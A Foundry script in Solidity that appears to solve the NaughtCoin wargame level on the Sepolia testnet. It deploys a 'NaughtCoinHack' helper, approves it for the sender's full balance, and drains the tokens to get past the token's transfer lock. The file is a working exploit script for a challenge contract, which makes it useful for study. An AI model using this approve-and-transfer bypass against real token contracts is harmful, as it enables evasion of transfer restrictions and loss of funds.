// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

import {Script, console} from "forge-std/Script.sol";
import {NaughtCoin, NaughtCoinHack} from "../src/NaughtCoin.sol";

contract NaughtCoinScript is Script {
    function setUp() public {}

    function run() public {
        hackContract();
    }

    function hackContract() internal {
        uint256 sepolia = vm.createFork(vm.rpcUrl("sepolia"));

        address CoinAddress = 0xE229165EC2D4E9921A4a55DE5a44aDfb90d84228;

        vm.selectFork(sepolia);

        vm.startBroadcast();

        console.log("Starting Hacking");

        NaughtCoinHack hack = new NaughtCoinHack();

        NaughtCoin coin = NaughtCoin(CoinAddress);

        uint256 initialBalance = coin.balanceOf(address(msg.sender));

        console.log("Initial Balance: ", initialBalance);

        IERC20(CoinAddress).approve(address(hack), initialBalance);

        hack.hack(CoinAddress, address(msg.sender), initialBalance);
        uint256 finalBalance = coin.balanceOf(address(msg.sender));

        console.log("Final Balance: ", finalBalance);

        assert(finalBalance == 0);

        vm.stopBroadcast();
    }
}
